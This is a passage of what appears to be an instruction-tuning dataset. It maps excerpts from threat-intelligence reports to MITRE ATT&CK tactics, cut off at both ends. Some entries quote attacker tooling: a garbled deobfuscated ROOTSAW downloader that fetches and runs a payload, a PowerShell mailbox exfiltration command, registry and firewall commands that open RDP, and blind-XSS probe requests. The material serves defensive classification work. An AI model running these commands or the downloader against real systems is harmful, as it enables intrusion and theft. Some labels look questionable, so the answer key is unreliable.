        "input": "Described attack activity: Starting as early as 26 February 2024, APT29 distributed phishing attachments containing links to an actor-controlled compromise website, \"waterforvoiceless[.]org/invite.php\", to redirect victims to a ROOTSAW dropper. This ROOTSAW variant uses the same JavaScript obfuscation resource used in previous APT29 operations, and ultimately results in a request to download and execute the second stage WINELOADER from the same server at  \"waterforvoiceless[.]org/util.php\". \nThe ROOTSAW payload contains a  JSObfuscated payload, that when parsed, results in the following code that is responsible for downloading a file to disk as \"invite.txt\", decoding it using Windows Certutil, then decompressing the code using tar. Finally, the legitimate Windows binary (SqlDumper.exe) is executed by the actor. \nvar a $=$ new ActiveXObject(\"Wscript.Shell\");   \nfunction Ijdaskj $W$ (_0x559297) { var $-9\\times3{\\mathsf{b d}}487={\\mathsf{n e w}}$ XMLHttpRequest(); _0x3bd487.onreadystatechange $=$ function if (_0x3bd487.readyState $==$ 0x4 && _0x var $\\_0{\\tt x11a a1}\\theta=\\_0{\\tt x3b d487},$ .response; var _0xce698d $=$ new ActiveXObject(\"S var $\\_6\\times28881c=\\_6\\times c=698d.0p e n\\top$ extFi   \n\\\\invite.txt\", $\\mathtt{6x2}$ , true, 0x0); _0x20081c.Write(_0x11aa10); _0x20081c.close(); a.Run(\"certutil -decode C:\\\\Windows\\   \n\\\\Tasks\\\\invite.zip\", 0x0); var _0x245d53 $=$ Date.now(); var $\\_{8\\times3\\times9\\times72}$ $=$ null; do { $-0{\\times}3+9+72=0{\\mathrm{ate}}.\\mathsf{n o w}();$ } while (_0x3f9f72 - _0x245d53 < 0xbb a.Run(\"tar -xf C:\\\\Windows\\\\Tasks\\\\i   \n\\\\ \", 0x0); var _0x245d53 = Date.now(); var $\\_{8\\times3\\times9\\times72}$ $=$ null; do { $-0{\\times}3+9+72=0{\\mathrm{ate}}.\\mathsf{n o w}();$ } while (_0x3f9f72 - _0x245d53 < 0xda a.Run(\"C:\\\\Windows\\\\Tasks\\\\SqlDumper } }; _0x3bd487.open(\"GET\", _0x559297, true); _0x3bd487.send(null);   \n}   \nIjdaskjw(\"https://waterforvoiceless.org/ut   \nInvite.pdf (MD5:   \nfb6323c19d3399ba94ecd391f7e35a9c)   \nSecond CDU-themed PDF lure document   \nWritten in LibreOffice 6.4 by default user \"Writer\" Metadata documents the PDF as en-GB language Links to https://waterforvoiceless[.]org/invite.php   \nZip file containing ROOTSAW   \nDownloaded from https://waterforvoiceless[.]org/invite.php   \nExecutes efafcd00b9157b4146506bd381326f39 \ninvite.hta (MD5: efafcd00b9157b4146506bd381326f39) \nROOTSAW downloader containing obfuscated code Downloads from https://waterforvoiceless[.]org/util.php   \nExtracts 44ce4b785d1795b71cee9f77db6ffe1b   \nExecutes f32c04ad97fa25752f9488781853f0ea \ninvite.txt (MD5: 44ce4b785d1795b71cee9f77db6ffe1b) \nMalicious certificate file, extracted using Windows Certutil   \nExecuted from efafcd00b9157b4146506bd381326f39   \nDownloaded from https://waterforvoiceless[.]org/util.php   \ninvite.zip (MD5:   \n5928907c41368d6e87dc3e4e4be30e42)   \nMalicious zip containing WINELOADER Extracted from 44ce4b785d1795b71cee9f77db6ffe1b APT29 Uses WINELOADER to Target German Political Parties | Google Cloud Blo   \nContains e017bfc36e387e8c3e7a338782805dde   \nContains f32c04ad97fa25752f9488781853f0ea   \nsqldumper.exe (MD5:   \nf32c04ad97fa25752f9488781853f0ea)   \nLegitimate Microsoft file Sqldumper used for side loading ",
        "output": "initial access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Alert\nInterestingly, the operator issued a command that displayed an alert informing the end user of a compromise, specifically with Cobalt Strike. Its unclear why the operator chose to do this, as this was around three hours prior to the ransomware being executed or a ransom note being dropped.\nThe alert message that was visible:\nThe activity can be observed in the PowerShell WinEvent logs:\nRansomware\nThe threat actors dropped the first of their ransomware binaries on the fourth day of the intrusion. Around 40 minutes after creating the alert messages for Cobalt Strike to show up, they dropped locker_64.exe on the backup server. They created a file (2.txt) and populated it with a list of hosts they had uncovered during their discovery activity. The locker_64.exe file was then renamed to 64.exe and executed using the text file in the command arguments:\nThe threat actors attempted to execute the malware across all hosts in the target list, but only execution on the backup server was observed.\nThe threat actor then tried again on a different server using a DLL this time:\nAgain, only execution on the server was observed. They then executed a new Cobalt Strike PowerShell beacon on a 3rd server and executed the ramsomware using that.\nThey then opened an RDP connection back to the primary domain controller and proceeded to try to execute the binary with a target list again. After only affecting the single host, the threat actors dropped several batch scripts on the server:\nThe script pass.bat proceeded to reset all the user accounts in the domain to a single password set by the threat actors.\nThere were thousands of Windows Security Event ID 4724 events generated within a two minute period.\nThis password reset would enable the next scripts to function as intended while also hampering any recovery activity.\nThe 1.bat file then proceeded to copy the ransomware binary across to hosts in the environment.\nFinally 2.bat used the reset password to enable psexec to execute the ransomware on all the remote hosts.\nWhen the payload was executed, there were some telltale registry events observed indicating .Quantum file extension Shell Open Command artifacts.\nThe HTML message was dropped in various directories across the endpoints:\nThe HTML file displayed the all but familiar message:\nThe following Locker files were then deleted:",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In several instances, analysis identified Unit 29155 cyber actors compressing victim data [T1560] (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure. These cyber actors commonly use the command-line program Rclone to exfiltrate data to a remote location from victim infrastructure. \nUnit 29155 cyber actors have exfiltrated Windows processes and artifacts, such as Local Security Authority Subsystem Service (LSASS) memory dumps [T1003.001], Security Accounts Manager (SAM) files [T1003.002], and SECURITY and SYSTEM event log files [T1654]. As seen in victim incident response results, actor infrastructure has also been used to compromise multiple mail servers [T1114] and exfiltrate mail artifacts, such as email messages, using PowerShell [T1059.001] via the following command: \npowershell New-MailboxExportRequest  Mailbox <resource>  FilePath \\`\\\\{IP Address}\\sharefolder\\1.pst\\` ",
        "output": "exfiltration",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Microsoft 365 Defender built-in detection: Risky user created global admin \nThis detection will alert users based on the risk score proved by Azure AD Identity Protection when a new global admin was created by a user that had a risky sign-in. An attacker might have compromised the user account to perform lateral movement. \nInvestigate the new global admin account to determine if it was created legitimately and if the user account that performed the action was compromised. ",
        "output": "privilege escalation",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1087.001 Account Discovery: Local Account\nT1087.002 Account Discovery: Domain Account\nT1615 Group Policy Discovery\nT1083 File and Directory Discovery\nT1069.001 Permission Groups Discovery: Local Groups\nT1069.002 Permission Groups Discovery: Domain Groups\nIn one instance, the threat actor used certutil to download PowerView to run various discovery commands. Below are some of the commands captured in Meterpreter history. The threat actor needed to output the commands to a public location served on an Exchange server to retrieve the results.\nT1016 System Network Configuration Discovery\nT1082 System Information Discovery\nT1033 System Owner/User Discovery\nIn another compromised host, we saw other common commands we observe to gain situational awareness in the environment.\nOther discovery commands used through Meterpreter include the following:\nadPEAS\nWhile using Sliver, the threat actor executedinvoke-adPEASat least twice:\nWhile using Sliver, the most used command was \"net user /domain\" followed by \"net user\":\nOther discovery commands that were used by the threat actor while using Sliver include the following:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The older \"mode\" variant of BitPaymer uses the Windows registry for persistence, while the newer service variant will attempt to install itself as a service. If that fails, it will fall back to using the Windows registry. ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To evade detection, the threat actors disabled Windows Defender by adding the below to an already linked GPO. They then force updated the GPO on all clients using Cobalt Strike.\nIn addition, other security services were stopped or uninstalled.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it:\nexdudipo.dll: IcedID first stage. \nlicense.dat: Encoded version of the second stage which the first stage will load into memory.\nA scheduled task was created that contained instructions on executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID has used for persistence.\nThe scheduled task was configured to execute every hour.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Persistence in KeyBase, should it be enabled, is achieved using two techniques-copying the malware to the startup folder or setting the Run registry key to autorun on startup. When KeyBase copies itself to the startup folder, it names itself 'Important.exe.' This is statically set by the author and cannot be changed by the user in the current version. The key used in the following Run registry key is set by the user, and is always a 32 byte hexadecimal value.\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run [32 byte key] : [Path to Executable]",
        "output": "persistence",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: No data collection was observed in this intrusion. The threat actors only collected the dumped LSASS using a zip archive:",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: DEV-0537 uses a variety of methods that are typically focused on compromising user identities to gain initial access to an organization including: \nDeploying the malicious Redline password stealer to obtain passwords and session tokens   \nPurchasing credentials and session tokens from criminal underground forums   \nPaying employees at targeted organizations (or suppliers/business partners) for access to credentials and MFA approval   \nSearching public code repositories for exposed credentials \nUsing the compromised credentials and/or session tokens, DEV-0537 accesses internet-facing systems and applications. These systems most commonly include virtual private network (VPN), remote desktop protocol (RDP), virtual desktop infrastructure (VDI) including Citrix, or identity providers (including Azure Active Directory, Okta). For organizations using MFA security, DEV-0537 used two main techniques to satisfy MFA requirementssession token replay and using stolen passwords to trigger simple-approval MFA prompts hoping that the legitimate user of the compromised account eventually consents to the prompts and grants the necessary approval. \nIn some cases, DEV-0537 first targeted and compromised an individual's personal or private (non-work-related) accounts giving them access to then look for additional credentials that could be used to gain access to corporate systems. Given that employees typically use these personal accounts or mobile phone numbers as their second-factor authentication or password recovery, the group would often use this access to reset passwords and complete account recovery actions. \nMicrosoft also found instances where the group successfully gained access to target organizations through recruited employees (or employees of their suppliers or business partners). DEV-0537 advertised that they wanted to buy credentials for their targets to entice employees or contractors to take part in its operation. For a fee, the willing accomplice must provide their credentials and approve the MFA prompt or have the user install AnyDesk or other remote management software on a corporate workstation allowing the actor to take control of an authenticated system. Such a tactic was just one of the ways DEV-0537 took advantage of the security access and business relationships their target organizations have with their service providers and supply chains. ",
        "output": "initial access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: DART was unable to determine the initial entry vector of this attack due to the age of this compromise and limited retention of security solutions, along with encrypted devices being reimaged before analysis. The earliest observed activity showed the actor with domain administrator credentials. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Multiple discovery techniques were observed throughout the case. The initial discovery techniques were conducted on the beachhead host by the IcedID malware  focusing on determining the system language and security products installed (T1518.001). Other familiar discovery techniques were then leveraged to establish situational awareness, such as network configurations and Windows domain configuration. Discovery was achieved using a combination of living off the land techniques (WMIC and CMD) and via third-party tools.\nThreat actors also used \"chcp\" for discovery of the system locale/language (T1614.001).Change Control Page (ChCP)is a Microsoft utility for changing the console control page (language). In this case, the existing control page language was collected using the following command:\nAs a test, entering this on a command prompt shows a numeric value. The Microsoft link shows the number of the language used (437  United States).It is highly likely that the threat actors were establishing the country of origin based on the language used  an extra fail-safe check to ensure certain users or regions were not targeted. The>&2parameter could indicate a parameter was expected as part of a script, or possibly a redirect using stderr. The second discovery was from a different Cobalt Strike beacon \"Faicuy4.exe\" which focused on domain discovery and user groups using the net command. Once the threat actors had achieved lateral movement to domain controllers, the AdFind utility was employed to enumerate active directory objects (T1018).'adf.bat' is a common batch file that we have observed in previous cases, we saw this script in 2020 as part of aRyuk intrusion. The recent Conti leaks indicate that Conti operators were surprised Ryuk operators were using their file.The PowerView module Invoke-ShareFinder was executed from the beachhead host and a domain controller.Some network discovery was conducted using the ping utility to check the existence of hosts on the network (T1049).Filesystem discovery (T1083) was conducted to collect directory lists to a text file.Other variations included:\nC:\\Windows\\system32\\cmd.exe /C dir \"\\\\<REDACTED>\\C$\" /s >> listback.txt \nC:\\Windows\\system32\\cmd.exe /C dir \"\\\\<REDACTED>\\C$\" /s >> list1.txt",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: FireEye believes that the actor behind NOTROBIN has been opportunistically compromising NetScaler devices, possibly to prepare for an upcoming campaign. They remove other known malware, potentially to avoid detection by administrators that check into their devices after reading Citrix security bulletin CTX267027. NOTROBIN mitigates CVE-2019- 19781 on compromised devices but retains a backdoor for an actor with a secret key. While we haven't seen the actor return, we're skeptical that ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Figure 10 below shows the trending graph seen in Autofocus on the number of malware download sessions for Orcus. Given the feature rich toolset and the scalability Orcus provides, it is not a surprise that the usage and acceptance of the Orcus RAT is growing among cyber criminals since being first sold early this year. Given the increasing popularity of Orcus, it is likely that we will see more cyber crime campaigns where the RAT of choice is Orcus.\nFigure 10 Autofocus graph of Orcus download sessions over time",
        "output": "impact",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Threat actors established persistence on all infected hosts they pivoted to in the network. The scheduled tasks were configured to load FlawedGrace using PowerShell. While the tasks created initially to run FlawedGrace were registered with the task name of\\2, tasks created for persistence used a naming convention mimicking various system tasks and placed under the \\Microsoft\\Windows\\ task path.\nThese tasks were then set up for aBootTriggerto restart the malware.\nPlease refer to the \"FlawedGrace\" portion of theExecution sectionfor details on the different execution methods threat actors used to register these scheduled tasks.\nOn the beachhead host, the threat actors added a user account named adminr. This account was then added to the Local Administrators group and Remote Desktop Users group. The account was observed being used to test RDP tunneling in the environment. This account was added and removed several times, but after the first three hours of access, it was deleted and not re-added by the threat actors.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attack begins with a spear-phishing email: we have observed cases where the malicious emails were sent from a legitimate account, suggesting that compromised accounts could have been abused to deliver the malicious emails. The email embeds a OneDrive URL link that downloads a ZIP file which contains a malicious Excel file. The Excel filename and email subject are designed to capture the target's interest. Some of file names and email subjects used in this campaign are listed below:\n<REDACTED>_\u4fee\u6b63\u6e08\u307f\u5c65\u6b74\u66f8 (Japanese translated to English: <REDACTED>_Revised Resume) \n\u81fa\u65e5\u9053\u8def\u4ea4\u901a\u5408\u4f5c\u8207\u8abf\u7814\u76f8\u95dc\u516c\u52d9\u51fa\u570b\u5831\u544a (Taiwanese translated to English: Report on Official Business Trips Abroad Related to Taiwan-Japan Road Transportation Cooperation and Research) \n\u61c9\u5fb5\u7814\u7a76\u52a9\u7406-<REDACTED> (Taiwanese translated to English: Research Assistant Application-<REDACTED>)",
        "output": "initial access",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To maintain access in a compromised network, the DEV-0270 actor adds or creates a new user account, frequently named DefaultAccount with a password of P@ssw0rd1234, to the device using the command net user /add. The DefaultAccount account is typically a pre-existing account set up but not enabled on most Windows systems. \nThe attacker then modifies the registry to allow remote desktop (RDP) connections for the device, adds a rule in the firewall using netsh.exe to allow RDP connections, and adds the user to the remote desktop users group: \n\"reg\" add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v TSEnabled /t REG_DWORD /d 1 /f \n\"reg\" add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 \n\"reg\" add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD \"netsh\" advfirewall firewall add rule name $^{\\cdot=}$ \"Terminal Server\" dir=in action=allow protocol=TCP localpor $=3389$ \nScheduled tasks are one of the recurrent methods used by DEV-0270 in their attacks to maintain access to a device. Generally, the tasks load via an XML file and are configured to run on boot with the least privilege to launch a .bat via the command prompt. The batch file results in a download of a renamed dllhost.exe, a reverse proxy, for maintaining control of the device even if the organization removes the file from the device. ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Two different suspicious batch scripts were dropped using RDP in the built-in Administrator's Music folder on the beachhead and one of the file servers. Upon execution, these two .bat scripts execute rclone.exe to exfiltrate files from the victim file shares:\nLikepast reportsthis threat actor also used theMega.ioservice as the remote exfiltration location for the stolen files. One interesting thing to mention is the naming convention for the scripts using \u043a\u043e\u043f\u0438\u044f, the Russian word for copy.\nThe configuration file for Rclone used by the threat actor was encrypted.\nAccording toRclone documentation:\nThis OPSEC by the threat actor helps mask the exfiltration account and other data that a less mindful threat actor may leave behind.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Compared to the previous version of this backdoor, the persistence mechanism for this remained largely the same. This version creates aLaunch Agentthat runs when the victim host starts up, where as in the previous version execution was upon when a user logs in. It also copies itself to a different location and filename based on the UID of the user who ran the application.\nFor a user other than root, it takes the MD5 hash of the structure returned bygetpwuid()and breaks the hash down into segments<first 8 chars of hash>-<next 16 chars of hash>-<last 8 chars of hash>. This segmented MD5 hash is prepended with\"0000-\"then used as a directory in~/Library/OpenSSL/to store the executable file (see Figure 3). If the user is root, the executable is stored in the system wide library directory at /Library/TimeMachine/bin/mtmfs.\nIt is interesting to note that the executable and plist locations look like legitimate applications.\nFigure 3. plist and executable names and locations based on UID\nOnce the malware has set up persistence, it deletes the application bundle from the executable path leaving the decoy document in its place and launches itself as a service from the new location.",
        "output": "persistence",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The method of establishing persistence has changed. Instead of creating scheduled tasks, the attackers now create new privileged local users on a business automation platform server. They use these accounts to connect to the server via RDP to transfer and execute tools interactively. \nThey also install traffic tunneling tools like Localtonet for persistent access to the target host. They made Localtonet persistent with the help of Non-Sucking Service Manager (NSSM), which allows running any application as a Windows service, as well as monitoring and restarting it if it fails for some reason. This user-friendly tool is often used legitimately to install and manage programs that cannot function as services. Localtonet and NSSM help the malicious actor to maintain continuous access to the infected host. ",
        "output": "persistence",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After compromising a host, the threat actors attempt to compromise other connected systems to move within the network. BRONZE BUTLER typically uses the following procedure for lateral movement: \nThe malicious file is typically a batch file that downloads malware and registers the malware's automatic execution in the registry.   \nFigure 13 shows the scheduled task that executes zrun.bat (a batch file) using the at command. ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the initial beachhead, various discovery commands were executed from the injected svchost.exe process.\nA diverse set of reconnaissance commands were also observed from the Cobalt Strike beacons:\nUsing the WMI class \"win32_logicaldisk\", (free) disk space information was gathered of the attached (network) drive letters.\nEncoded command:\nDecoded command:\nThe threat actor made use of the Active Directory module to save hostname, OS and last logon date information of all AD Computer objects in a CSV file.\nIn addition, all of the IP-addresses in the LAN were scanned on port 445/SMB, potentially to identify other interesting targets.\nThe following set of files were copied to the domain controller:\nAlready covered in a previouscase, the batch and PowerShell scripts serve as a data collector to enumerate hosts within the target environment. It collects data about active/dead hosts, disks, and installed software; and stores it in a zip file.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For coin miner malware, persistence is key. These types of malware employ various techniques to stay undetected for long periods of time in order to mine coins using stolen computer resources. \nTo stay hidden, Dofoil modifies the registry. The hollowed explorer.exe process creates a copy of the original malware in the Roaming AppData folder and renames it to ditereah.exe. It then creates a registry key or modifies an existing one to point to the newly created malware copy. In the sample we analyzed, the malware modified the OneDrive Run key. ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: BlackCat is an innovative and sophisticated ransomware family that is rapidly forming a reputation for its highly customized and individualized attacks. By leveraging the Rust programming language, the malware authors are able to easily compile it against various operating system architectures, which facilitates the group's ability to pivot from one victim to the next. As seen with other ransomware families, BlackCat operates with a RaaS model and utilizes multiple extortion techniques, then publishes a leak site to further pressure victims into paying the ransom.\nPalo Alto Networks detects and prevents BlackCat ransomware in the following ways:\nWildFire: All known samples are identified as malware. \nCortex XDRwith:Indicators for BlackCat.Anti-Ransomware Module to detect BlackCat encryption behaviors on Windows.Local Analysis detection for BlackCat binaries on Windows.BTP rule prevents Ransomware activity on Linux. \nIndicators for BlackCat. \nAnti-Ransomware Module to detect BlackCat encryption behaviors on Windows. \nLocal Analysis detection for BlackCat binaries on Windows. \nBTP rule prevents Ransomware activity on Linux. \nNext-Generation Firewalls: DNS Signatures detect the known command and control (C2) domains, which are also categorized as malware inURL Filtering.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Miniduke/CosmicDuke is capable of starting via Windows Task Scheduler, via a customized service binary that spawns a new process set in the special registry key, or is launched when the user is away and the screensaver is activated. ",
        "output": "persistence",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors displayed multiple techniques for gathering credentials during this intrusion. Credentials were dumped manually via Task Manager as they RDPed into each system.While established on a domain controller the threat actors also created and accessed a shadow copy of the ntds.dit and most likely exfiltrated it via their Koadic C2 channel.Event ID 1917 (The shadow copy backup for Active Directory Domain Services was successful) was logged to the Directory Service event log on the domain controller. The threat actors also executed a PowerShell script across the environment using PsExec that took advantage ofcomsvcs.dllto dump the lsass process and then copy the dump back to their pivot position on a domain controller.The threat actors tried using the Sysinternals ProcDump method but the executable was not present on the endpoint.\nThe threat actors were focused on the backup server for quite awhile as they dumped credentials from the 3rd party backup software repository. The first script pulls the hashes out of the database and the second decodes the password to plain text. Both scripts were run via PowerShell ISE.\nThe threat actors also ran Invoke-Mimikatz from BC-Security on one of the domain controllers.\nWe also saw the threat actors save LSA Secrets to disk using the hashdump_sam module in Koadic which runs impacket.Inveighwas run on a domain controller.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While previous Head Mare attacks relied solely on phishing emails with malicious attachments, they now also infiltrate victims' infrastructure through compromised contractors with access to business automation platforms and RDP connections. This confirms the trend of hacktivists exploiting trusted relationships (T1199    Trusted Relationship and T1078    Valid Accounts). \nThe attackers also exploited software vulnerabilities, most commonly CVE-2023-38831 in WinRAR through phishing emails. In one incident, they exploited the Microsoft Exchange server vulnerability CVE-2021-26855 (ProxyLogon). Although patched in 2021, this vulnerability is still exploitable due to organizations using outdated operating systems and software. Our telemetry data revealed domain controllers still running Microsoft Windows Server 2012 R2 Server Standard x64 or, as in the aforementioned incidents, Microsoft Exchange Server 2016 used for email. \nThe attackers used ProxyLogon to execute a command to download and launch CobInt on the server. ",
        "output": "initial access",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 29155 cyber actors have been observed targeting IP ranges [T1595.001] used within multiple government and critical infrastructure organizations. The following are publicly available tools these cyber actors have used for scanning [T1595] and vulnerability exploit efforts. Unit 29155 cyber actors were not observed using these tools outside of their intended purpose. Note: Use of these tools should not be attributed as malicious without analytical evidence to support threat actor use and/or control. \n\uf0a7 Acunetix: Unit 29155 cyber actors leveraged both Acunetix and Nmap to identify open ports, services, and vulnerabilities for networks [T1595.002].[6] \nAmass: Unit 29155 cyber actors leveraged both Amass and VirusTotal to obtain subdomains for target websites [T1590.002].[7] \nDroopescan[8] \nJoomScan[9] \nMASSCAN: Unit 29155 cyber actors used MASSCAN and Nmap to discover other machines once inside victim networks.[10] \nNetcat[11] \nNmap: Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning other machines [T1046]. \nShodan: Unit 29155 cyber actors used Shodan to identify hosts with a specific set of vulnerabilities or device types [T1596.005].[12] \nVirusTotal[13] \nWPScan \nAdditionally, Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration. Adminer in combination with Impacket and ldapdomaindump were tools used for gathering information on AD. Once active devices are found, Unit 29155 cyber actors look for vulnerabilities to exploit. For example, the Acunetix vulnerability scanning tool has been used for gathering information on potential vulnerabilities such as blind cross-site scripting, as shown in the following commands: \nGET /index.php?log=to@example.com>%0d%0abcc:009247.3183- 377.3183.1bf6c.19446.2@bxss.me \n\"GET /CMS/files/log.htm HTTP/1.1\" \\* \\* \"(nslookup hitccruvbrumn76c1b.bxss.me||perl -e \\\"gethostbyname('hitccruvbrumn76c1b.bxss.me')\\\")\" \nAs the cyber actors perform reconnaissance on victim networks and discover vulnerabilities within victim web servers or machines, they obtain CVE exploit scripts from GitHub repositories and use them against victim infrastructure [T1588.005]. Unit 29155 cyber actors have been observed obtaining the respective exploit scripts for, but not exploiting, the following CVEs: \nCVE-2020-1472 (Microsoft: Windows Server) \uf0a7 CVE-2021-26084 (Atlassian Confluence Server and Data Center) \uf0a7 CVE-2021-3156 (Red Hat: Privilege Escalation via Command Line Argument Parsing) \uf0a7 CVE-2021-4034 (Red Hat: Polkit Privilege Escalation) \uf0a7 CVE-2022-27666 (Red Hat: Heap Buffer Overflow Flaw) Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: \nCVE-2021-33044 (Dahua Security) CVE-2021-33045 (Dahua Security) \nCVE-2022-26134 (Atlassian Confluence Server and Data Center) CVE-2022-26138 (Atlassian Confluence Server and Data Center) CVE-2022-3236 (Sophos: Firewall) ",
        "output": "other",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
